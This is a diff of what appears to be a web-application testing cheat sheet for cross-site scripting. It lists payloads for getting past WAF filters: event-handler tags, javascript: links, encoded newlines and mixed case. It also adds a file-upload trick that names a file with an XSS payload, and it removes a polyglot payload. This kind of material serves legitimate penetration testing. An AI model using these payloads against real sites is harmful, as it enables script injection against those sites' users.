@@ -33,15 +33,19 @@ Is <.script>alert(1)</script.> filtered? Try: <br>
 <.randomfaketag id=x onwheel=alert(1)><br>
 <.a href=javascript:alert(1)>click</a.><br>
 <.ScRiPt>alert(1)<./ScRiPt><br>
+Run through the payload list here on intruder and select grep for url decoded values https://github.com/payloadbox/xss-payload-list/blob/master/Intruder/xss-payload-list.txt <br>
 < and > can be replace with html entities &lt; and &gt; <br>
 You can try an XSS polyglot <br>
-<code>javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'> <br>
- https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626 </code><br>
+ https://gist.github.com/michenriksen/d729cd67736d750b3551876bbedbe626<br>
 Try New Lines to break the firewall - newline URL encoded is %0 - <.script>%0alert(1)</script> - try with different HTML tags <br>
 Try double encoding a newline break %2522 <br> 
 New Line breaks often work on <.a/href=%2522javascript:alert(1)> <br>
 Injecting anchor tag without whitespaces -breaking up characters with decoded value of %26Tab%3B (url decode character) between each character<br>
  Try bypassing spaces with a bullet if / does not work - <code><.svg•onload=alert(1)> </code><br>
+ <br>
+ <h3> File Upload XSS </h3><br>
+ If you find a file upload feature, try naming the file to an xss payload. Use burp intercept to rename files <br>
+ Give file xss payload name cp somefile.txt \"\>\<img\ src\ onerror=prompt\(1\)\> <br>
 <br>
 <h2>A href bypasses</h2>
 If exploiting <a. href></a> xss and "javasript" is blocked by WAF or URL then try the below. <br>
